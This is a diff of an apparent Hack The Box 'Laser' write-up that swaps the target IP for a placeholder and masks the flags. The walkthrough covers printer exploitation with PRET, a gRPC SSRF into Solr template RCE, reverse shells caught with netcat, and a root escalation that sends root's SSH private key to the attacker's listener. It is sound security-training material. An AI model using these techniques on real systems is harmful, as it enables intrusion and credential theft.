@@ -11,9 +11,7 @@ htb_url: https://app.hackthebox.com/machines/Laser
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-laser-infocard.png)
-
- This Insane-difficulty machine from [Hack The Box](https://www.linkedin.com/company/hackthebox/) took me a lot longer to progress to the initial foothold than most boxes take to root!  This machine had some very interesting avenues of approach that greatly differed from the standard enumeration and progression that most of the lower difficulty machines require. I had to research new protocols just to begin, and by the end had to write five python scripts to progress through the initial foothold and for later privilege escalation.  All in all it was a fun, but very challenging ride!
+This Insane-difficulty machine from [Hack The Box](https://www.linkedin.com/company/hackthebox/) took me a lot longer to progress to the initial foothold than most boxes take to root!  This machine had some very interesting avenues of approach that greatly differed from the standard enumeration and progression that most of the lower difficulty machines require. I had to research new protocols just to begin, and by the end had to write five python scripts to progress through the initial foothold and for later privilege escalation.  All in all it was a fun, but very challenging ride!
 
 ## Useful Skills and Tools
 
@@ -29,11 +27,11 @@ htb_url: https://app.hackthebox.com/machines/Laser
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.201`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
-└─$ nmap -sCV -n -v -p- -oA laser 10.10.10.201                
+└─$ nmap -sCV -n -v -p- -oA laser <YOUR_IP>                
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 15:31 EST
 NSE: Loaded 153 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -44,25 +42,25 @@ Completed NSE at 15:31, 0.00s elapsed
 Initiating NSE at 15:31
 Completed NSE at 15:31, 0.00s elapsed
 Initiating Ping Scan at 15:31
-Scanning 10.10.10.201 [2 ports]
+Scanning <YOUR_IP> [2 ports]
 Completed Ping Scan at 15:31, 0.04s elapsed (1 total hosts)
 Initiating Connect Scan at 15:31
-Scanning 10.10.10.201 [65535 ports]
-Discovered open port 22/tcp on 10.10.10.201
-Discovered open port 9100/tcp on 10.10.10.201
-Discovered open port 9000/tcp on 10.10.10.201
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 22/tcp on <YOUR_IP>
+Discovered open port 9100/tcp on <YOUR_IP>
+Discovered open port 9000/tcp on <YOUR_IP>
 Completed Connect Scan at 15:31, 20.79s elapsed (65535 total ports)
 Initiating Service scan at 15:31
-Scanning 2 services on 10.10.10.201
+Scanning 2 services on <YOUR_IP>
 Completed Service scan at 15:31, 8.73s elapsed (3 services on 1 host)
-NSE: Script scanning 10.10.10.201.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 15:31
 Completed NSE at 15:32, 14.21s elapsed
 Initiating NSE at 15:32
 Completed NSE at 15:32, 0.09s elapsed
 Initiating NSE at 15:32
 Completed NSE at 15:32, 0.00s elapsed
-Nmap scan report for 10.10.10.201
+Nmap scan report for <YOUR_IP>
 Host is up (0.038s latency).
 Not shown: 65532 closed ports
 PORT     STATE SERVICE     VERSION
@@ -129,9 +127,9 @@ First I tried firing up a browser to see what kind of reply I might get from the
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
-└─$ telnet 10.10.10.201 9100
-Trying 10.10.10.201...
-Connected to 10.10.10.201.
+└─$ telnet <YOUR_IP> 9100
+Trying <YOUR_IP>...
+Connected to <YOUR_IP>.
 Escape character is '^]'.
 test
 ?
@@ -154,10 +152,10 @@ One of the sources pointed out that if you can access a printer and also SNMP, t
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
-└─$ sudo nmap -sU -p161 --reason 10.10.10.201
+└─$ sudo nmap -sU -p161 --reason <YOUR_IP>
 sudo: unable to resolve host kali: Name or service not known
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 16:24 EST
-Nmap scan report for 10.10.10.201
+Nmap scan report for <YOUR_IP>
 Host is up, received echo-reply ttl 63 (0.041s latency).
 
 PORT    STATE  SERVICE REASON
@@ -176,7 +174,7 @@ After searching a bit more I came across a nice toolkit someone had put together
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser/PRET]
-└─$ python pret.py -o laser.pret 10.10.10.201 ps                                                    1 ⨯
+└─$ python pret.py -o laser.pret <YOUR_IP> ps                                                    1 ⨯
       ________________                                             
     _/_______________/|                                            
    /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
@@ -190,23 +188,23 @@ After searching a bit more I came across a nice toolkit someone had put together
      (ASCII art by                                                 
      Jan Foerster)                                                 
 
-Connection to 10.10.10.201 established
+Connection to <YOUR_IP> established
 Command execution failed (timed out)
 
 Forcing reconnect. Connection closed.
-Connection to 10.10.10.201 established
+Connection to <YOUR_IP> established
 
 No feedback (Printer busy, non-ps or silent)
 ^CDevice:   
 Forcing reconnect. Connection closed.
-Connection to 10.10.10.201 established
+Connection to <YOUR_IP> established
 
-10.10.10.201:/> test
+<YOUR_IP>:/> test
 Unknown command: 'test'
-10.10.10.201:/> 
+<YOUR_IP>:/> 
 
 ┌──(zweilos㉿kali)-[~/htb/laser/PRET]
-└─$ python pret.py -o laser.pret 10.10.10.201 pcl
+└─$ python pret.py -o laser.pret <YOUR_IP> pcl
       ________________                                             
     _/_______________/|                                            
    /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
@@ -220,11 +218,11 @@ Unknown command: 'test'
      (ASCII art by                                                 
      Jan Foerster)                                                 
 
-Connection to 10.10.10.201 established
+Connection to <YOUR_IP> established
 Device:   Unknown printer
 
 Welcome to the pret shell. Type help or ? to list commands.
-10.10.10.201:/> help
+<YOUR_IP>:/> help
 
 Available commands (type help <topic>):
 =======================================
@@ -235,11 +233,11 @@ close  delete  edit      free  help  load  ls    print  selftest  timeout
 Following the instructions, I was able to quickly get it up and running, and got a pret shell on the machine using the PS printer language. This only gave errors, so I switched to the PCL language and tried again.  This time I was able to use the `help` command to get a list of further options to try.
 
 ```text
-10.10.10.201:/> ls
+<YOUR_IP>:/> ls
 Command execution failed (timed out)
 
 Forcing reconnect. Connection closed.
-Connection to 10.10.10.201 established
+Connection to <YOUR_IP> established
 
 This is a virtual pclfs. Use 'put' to upload files.
 ```
@@ -252,7 +250,7 @@ After reading up about the difference between the printer languages I decided th
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser/PRET]
-└─$ python pret.py -o laser.pret 10.10.10.201 pjl
+└─$ python pret.py -o laser.pret <YOUR_IP> pjl
       ________________                                             
     _/_______________/|                                            
    /___________/___//||   PRET | Printer Exploitation Toolkit v0.40
@@ -266,11 +264,11 @@ After reading up about the difference between the printer languages I decided th
      (ASCII art by                                                 
      Jan Foerster)                                                 
 
-Connection to 10.10.10.201 established
+Connection to <YOUR_IP> established
 Device:   LaserCorp LaserJet 4ML
 
 Welcome to the pret shell. Type help or ? to list commands.
-10.10.10.201:/> help
+<YOUR_IP>:/> help
 
 Available commands (type help <topic>):
 =======================================
@@ -281,21 +279,21 @@ chvol   disable   find    help  loop    open       reset     timeout
 close   discover  flood   hold  ls      pagecount  restart   touch    
 debug   display   format  id    mirror  print      selftest  traversal
 
-10.10.10.201:/>
+<YOUR_IP>:/>
 ```
 
 After testing all of the PCL commands and getting nothing I went back and tried the third language, PJL, and got another shell with many more commands available after using the `help` command.
 
 ```text
-10.10.10.201:/> ls
+<YOUR_IP>:/> ls
 d        -   pjl
-10.10.10.201:/> cd pjl
-10.10.10.201:/pjl> ls
+<YOUR_IP>:/> cd pjl
+<YOUR_IP>:/pjl> ls
 d        -   jobs
-10.10.10.201:/pjl> cd jobs/
-10.10.10.201:/pjl/jobs> ls
+<YOUR_IP>:/pjl> cd jobs/
+<YOUR_IP>:/pjl/jobs> ls
 -   172199   queued
-10.10.10.201:/pjl/jobs> cat queued
+<YOUR_IP>:/pjl/jobs> cat queued
 b'VfgBAAAAAADOiDS0d+nn3sdU24Myj/njDqp6+zamr0JMcj84pLvGcvxF5IEZAbjjAH
 
 ...huge text wall snipped...
@@ -310,7 +308,7 @@ I made the mistake of **`cat`**-ing the **`queued`** file at first. Don't do thi
 {% endhint %}
 
 ```text
-10.10.10.201:/pjl/jobs> get queued
+<YOUR_IP>:/pjl/jobs> get queued
 172199 bytes received.
 ```
 
@@ -325,7 +323,7 @@ base64: invalid input
 After removing the extra characters \(that looked to indicate that it was supposed to be a python byte string\) from the file I tried to base64 decode it, but it still seemed to be invalid encoding.  I decided to keep enumerating to see if I could find anything to help me move forward.
 
 ```text
-10.10.10.201:/pjl/jobs> df
+<YOUR_IP>:/pjl/jobs> df
 VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
 0:     1755136    1718272    <HT>     <HT>  READ-WRITE
 ```
@@ -333,11 +331,11 @@ VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
 I did seem to have read-write access on the local drive.  I wondered if there was a way to write something malicious to the printer to execute code...
 
 ```text
-10.10.10.201:/pjl/jobs> id
+<YOUR_IP>:/pjl/jobs> id
 LaserCorp LaserJet 4ML
-10.10.10.201:/pjl/jobs> pagecount
+<YOUR_IP>:/pjl/jobs> pagecount
 Hardware page counter: PAGECOUNT=183933
-10.10.10.201:/> flood
+<YOUR_IP>:/> flood
 Receiving PJL variables. Found 29 variables.
 Buffer size: 10000, Sending: @PJL SET COPIES=[buffer]
 Buffer size: 10000, Sending: @PJL SET PAPER=[buffer]
@@ -385,7 +383,7 @@ Buffer size: 10000, Sending: @PJL FSDIRLIST NAME="[buffer]"
 Buffer size: 10000, Sending: @PJL FSINIT VOLUME="[buffer]"
 Buffer size: 10000, Sending: @PJL FSMKDIR NAME="[buffer]"
 Buffer size: 10000, Sending: @PJL FSUPLOAD NAME="[buffer]"
-10.10.10.201:/> display
+<YOUR_IP>:/> display
 Message: test
 Setting printer's display message to "test"
 ```
@@ -393,7 +391,7 @@ Setting printer's display message to "test"
 Most of the commands gave nothing useful back.
 
 ```text
-10.10.10.201:/> env
+<YOUR_IP>:/> env
 COPIES=1 [2 RANGE]
         1
         999
@@ -506,7 +504,7 @@ LPARM:ENCRYPTION MODE=AES [CBC]
 The command `env` showed me the values of the printer's environment variables.  The line `LPARM:ENCRYPTION MODE=AES [CBC]` looked like it might be useful if I encountered encrypted passwords or such.
 
 ```text
-10.10.10.201:/> info
+<YOUR_IP>:/> info
 Show information:  info <category>
   info config      - Provides configuration information.
   info filesys     - Returns PJL file system information.
@@ -516,7 +514,7 @@ Show information:  info <category>
   info status      - Provides the current printer status.
   info ustatus     - Lists the unsolicited status variables.
   info variables   - Lists printer's environment variables.
-10.10.10.201:/> info config
+<YOUR_IP>:/> info config
 IN TRAYS [3 ENUMERATED]
         INTRAY1 MP
         INTRAY2 PC
@@ -547,7 +545,7 @@ FONT CARTRIDGE SLOTS [1 ENUMERATED]
 MEMORY=2097152
 DISPLAY LINES=1
 DISPLAY CHARACTER SIZE=16
-10.10.10.201:/> info config
+<YOUR_IP>:/> info config
 IN TRAYS [3 ENUMERATED]
         INTRAY1 MP
         INTRAY2 PC
@@ -578,19 +576,19 @@ FONT CARTRIDGE SLOTS [1 ENUMERATED]
 MEMORY=2097152
 DISPLAY LINES=1
 DISPLAY CHARACTER SIZE=16
-10.10.10.201:/> info filesys
+<YOUR_IP>:/> info filesys
 VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
 0:     1755136    1718272    <HT>     <HT>  READ-WRITE
-10.10.10.201:/> info id
+<YOUR_IP>:/> info id
 LaserCorp LaserJet 4ML
-10.10.10.201:/> info memory
+<YOUR_IP>:/> info memory
 TOTAL=1494416
 LARGEST=1494176
-10.10.10.201:/> info status
+<YOUR_IP>:/> info status
 CODE=10001
 DISPLAY="LaserCorp supply in use"
 ONLINE=TRUE
-10.10.10.201:/> info ustatus
+<YOUR_IP>:/> info ustatus
 DEVICE=OFF [3 ENUMERATED]
         OFF
         ON
@@ -609,11 +607,11 @@ TIMED=0 [2 RANGE]
 The `info` command seemed to give pretty much the same information as some of the other commands...meaning nothing useful.
 
 ```text
-10.10.10.201:/> mirror
+<YOUR_IP>:/> mirror
 Creating mirror of /
 Traversing pjl/
 Traversing pjl/jobs/
-0:/pjl/jobs/queued -> /home/zweilos/htb/laser/PRET/mirror/10.10.10.201/0/pjl/jobs/queued
+0:/pjl/jobs/queued -> /home/zweilos/htb/laser/PRET/mirror/<YOUR_IP>/0/pjl/jobs/queued
 172199 bytes received.
 ```
 
@@ -622,13 +620,13 @@ The `mirror` command seemed to be pretty interesting, as it created a mirror of 
 ### Decoding the `queued` file
 
 ```text
-10.10.10.201:/> nvram
+<YOUR_IP>:/> nvram
 NVRAM operations:  nvram <operation>
   nvram dump [all]         - Dump (all) NVRAM to local file.
   nvram read addr          - Read single byte from address.
   nvram write addr value   - Write single byte to address.
-10.10.10.201:/> nvram dump
-Writing copy to nvram/10.10.10.201
+<YOUR_IP>:/> nvram dump
+Writing copy to nvram/<YOUR_IP>
 ..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................k...e....y.....13u94r6..643rv19u
 ```
 
@@ -666,14 +664,14 @@ I got the above data points back from the capture.  They looked like decimal enc
 The key was decimal encoded, so I used CyberChef to decode it and got the key `13vu94r6643rv19u`. For some reason the console output didn't decode it properly from the `nvram` command. \(I'm also not sure what the `46` characters were in the middle of the two halves, but they weren't needed. Some sort of delimiter for the two halves?\)
 
 ```text
-10.10.10.201:/> selftest
-10.10.10.201:/> traversal
+<YOUR_IP>:/> selftest
+<YOUR_IP>:/> traversal
 Path traversal unset.
-10.10.10.201:/> traversal
+<YOUR_IP>:/> traversal
 Path traversal unset.
-10.10.10.201:/> unlock
+<YOUR_IP>:/> unlock
 Cannot unlock (locking not supported by device)
-10.10.10.201:/> version
+<YOUR_IP>:/> version
 Not available.
 ?
 ?
@@ -856,7 +854,7 @@ I then created a python client `grpc_client.py` to connect to port 9000 on the s
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ nc -lvnp 8099                                 
 listening on [any] 8099 ...
-connect to [10.10.15.98] from (UNKNOWN) [10.10.10.201] 55426
+connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 55426
 GET / HTTP/1.1
 Host: 10.10.15.98:8099
 User-Agent: FeedBot v1.0
@@ -887,7 +885,7 @@ Traceback (most recent call last):
 grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
         status = StatusCode.UNKNOWN
         details = "Exception calling application: (7, 'Failed to connect to 10.10.15.98 port 8099: Connection refused')"
-        debug_error_string = "{"created":"@1606012822.063558307","description":"Error received from peer ipv4:10.10.10.201:9000","file":"src/core/lib/surface/call.cc","file_line":1061,"grpc_message":"Exception calling application: (7, 'Failed to connect to 10.10.15.98 port 8099: Connection refused')","grpc_status":2}"
+        debug_error_string = "{"created":"@1606012822.063558307","description":"Error received from peer ipv4:<YOUR_IP>:9000","file":"src/core/lib/surface/call.cc","file_line":1061,"grpc_message":"Exception calling application: (7, 'Failed to connect to 10.10.15.98 port 8099: Connection refused')","grpc_status":2}"
 >
 ```
 
@@ -904,9 +902,9 @@ After redirecting the target to be the internal machine I got an error message w
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ ping printer.laserinternal.htb               
-PING printer.laserinternal.htb (10.10.10.201) 56(84) bytes of data.
-64 bytes from printer.laserinternal.htb (10.10.10.201): icmp_seq=1 ttl=63 time=40.9 ms
-64 bytes from printer.laserinternal.htb (10.10.10.201): icmp_seq=2 ttl=63 time=41.6 ms
+PING printer.laserinternal.htb (<YOUR_IP>) 56(84) bytes of data.
+64 bytes from printer.laserinternal.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=40.9 ms
+64 bytes from printer.laserinternal.htb (<YOUR_IP>): icmp_seq=2 ttl=63 time=41.6 ms
 ^C
 --- printer.laserinternal.htb ping statistics ---
 2 packets transmitted, 2 received, 0% packet loss, time 1001ms
@@ -928,7 +926,6 @@ import laser_pb2
 import grpc
 import base64
 import pickle
-
 
 def scan():
     #Run the below code for all 65535 ports (minus 0)
@@ -1026,7 +1023,7 @@ data2 = f"http://localhost:8983/solr/staging/select?q=1&&wt=velocity&v.template=
 feed = '{"version": "v1.0", "title": "Printer Feed", "feed_url": "replaceMe"}'
 
 #no creds, so need insecure channel
-channel = grpc.insecure_channel("10.10.10.201:9000")
+channel = grpc.insecure_channel("<YOUR_IP>:9000")
 stub = laser_pb2_grpc.PrintStub(channel)
 
 #this @func_set_timeout(5) will make it so execution will continue after 5 seconds; This is needed since it hangs on this part otherwise
@@ -1062,7 +1059,7 @@ After a lot of trial and error, I got my code to work and set up a netcat listen
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ nc -lvnp 8099
 listening on [any] 8099 ...
-connect to [10.10.15.98] from (UNKNOWN) [10.10.10.201] 36790
+connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 36790
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 solr@laser:~$ id && hostname
 uid=114(solr) gid=120(solr) groups=120(solr)
@@ -1130,7 +1127,7 @@ drwxr-xr-x 3 root root 4096 Jun 29 06:55 ..
 drwxr-xr-x 4 solr solr 4096 Jun 19  2020 feed_engine
 -r-------- 1 solr solr   33 Dec 18 05:49 user.txt
 solr@laser:/home/solr$ cat user.txt 
-1cc8750f9c5a710bc55718f7e7e2c762
+****
 ```
 
 The file `user.txt` was in `/home/solr` as expected, however I was confused at first since this was not the user's home directory.
@@ -1141,7 +1138,7 @@ The file `user.txt` was in `/home/solr` as expected, however I was confused at f
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
-└─$ ssh solr@10.10.10.201 -i solr.key 
+└─$ ssh solr@<YOUR_IP> -i solr.key 
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -1158,16 +1155,14 @@ Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
   Users logged in:                  1
   IPv4 address for br-3ae8661b394c: 172.18.0.1
   IPv4 address for docker0:         172.17.0.1
-  IPv4 address for ens160:          10.10.10.201
+  IPv4 address for ens160:          <YOUR_IP>
   IPv6 address for ens160:          dead:beef::250:56ff:feb9:a0e8
-
 
 73 updates can be installed immediately.
 0 of these updates are security updates.
 To see these additional updates run: apt list --upgradable
 
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 Last login: Tue Aug  4 07:01:35 2020 from 10.10.14.3
 solr@laser:~$
@@ -1185,7 +1180,7 @@ solr@laser:/home/solr$ ip a
        valid_lft forever preferred_lft forever
 2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
     link/ether 00:50:56:b9:a0:e8 brd ff:ff:ff:ff:ff:ff
-    inet 10.10.10.201/24 brd 10.10.10.255 scope global ens160
+    inet <YOUR_IP>/24 brd <YOUR_IP> scope global ens160
        valid_lft forever preferred_lft forever
     inet6 dead:beef::250:56ff:feb9:a0e8/64 scope global dynamic mngtmpaddr 
        valid_lft 86266sec preferred_lft 14266sec
@@ -1476,7 +1471,6 @@ Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
 
-
 This system has been minimized by removing packages and content that are
 not required on a system that users do not log into.
 
@@ -1608,7 +1602,7 @@ The process that would run my malicious `clear.sh` also deleted my file, so I ha
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ nc -lvnp 9099
 listening on [any] 9099 ...
-connect to [10.10.15.98] from (UNKNOWN) [10.10.10.201] 38660
+connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 38660
 -----BEGIN RSA PRIVATE KEY-----
 MIIG5AIBAAKCAYEAsCjrnKOm6iJddcSIyFamlV1qx6yT9X+X/HXW7PlCGMif79md
 zutss91E+K5D/xLe/YpUHCcTUhfPGjBjdPmptCPaiHd30XN5FmBxmN++MAO68Hjs
@@ -1656,7 +1650,7 @@ I received the SSH key back at my waiting listener almost immediately after star
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
-└─$ ssh root@10.10.10.201 -i laser.key
+└─$ ssh root@<YOUR_IP> -i laser.key
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -1673,9 +1667,8 @@ Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
   Users logged in:                  1
   IPv4 address for br-3ae8661b394c: 172.18.0.1
   IPv4 address for docker0:         172.17.0.1
-  IPv4 address for ens160:          10.10.10.201
+  IPv4 address for ens160:          <YOUR_IP>
   IPv6 address for ens160:          dead:beef::250:56ff:feb9:a0e8
-
 
 73 updates can be installed immediately.
 0 of these updates are security updates.
@@ -1683,10 +1676,9 @@ To see these additional updates run: apt list --upgradable
 
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
-
 Last login: Sat Dec 19 18:36:54 2020 from 10.10.15.98
 root@laser:~# cat root.txt 
-fbc1f51182883512bf591862b54464c7
+****
 root@laser:~# id && hostname
 uid=0(root) gid=0(root) groups=0(root)
 laser
@@ -1725,7 +1717,3 @@ service solr start
 In the root directory I also found the scripts that explained how this machine worked.
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-laser-pwned.png)
-
-Thanks to [`MrR3boot`](https://app.hackthebox.eu/users/13531) & [`R4J`](https://app.hackthebox.eu/users/13243) for creating such a fun and interesting test of my python abilities.  I think this is the first time that I have had to write so many scripts for just one machine.  It was nice to learn about some new protocols, and also work in some API interaction as well.  
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
